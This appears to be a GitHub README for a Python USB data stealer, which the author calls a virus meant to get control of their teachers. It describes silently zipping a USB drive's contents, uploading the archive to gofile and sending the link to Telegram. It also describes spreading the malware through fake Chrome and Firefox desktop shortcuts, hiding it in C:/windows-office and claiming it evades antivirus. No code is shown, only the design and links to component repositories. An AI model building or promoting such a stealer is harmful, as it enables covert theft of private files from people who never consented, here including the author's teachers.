> ## story🎴 ##
I needed a virus to get control of my teachers.

> ## Information🔍 ##
I've created a python program consisting of three scripts to send all the data on a USB flash drive in a zip file to telegram. 

>The first script is usb.py, which will detect the insertion of a USB flash drive and send it to Windows as a zip file. Thanks to : @bestmahdi2 https://github.com/bestmahdi2/FileStealerUSB2PC/blob/master/FileStealerUSB2PC.py

>The second script will upload the zip file to gofile thanks to : @khodekhadem https://github.com/j0rd1s3rr4n0/FileUploader/tree/main/GoFIle

>And the third script will send the file link to telegram.

The virus is propagated by launching the file pyth0n.ps1 or Pyth0n.exe, which will create a shortcut on the desktop named chrome and firefox so that the virus is launched when the user clicks on it. Launching pyth0n will also move the virus to C:/windows-office. 
The principle of this virus is that it is undetectable by antivirus software and completely anonymous.




To get an .exe file instead of the used python: auto-py-to-exe https://pypi.org/project/auto-py-to-exe/

> ## Bug🦠 ##

At the moment I can't hide the stealer window. The terminal is therefore visible. I'm working on it.
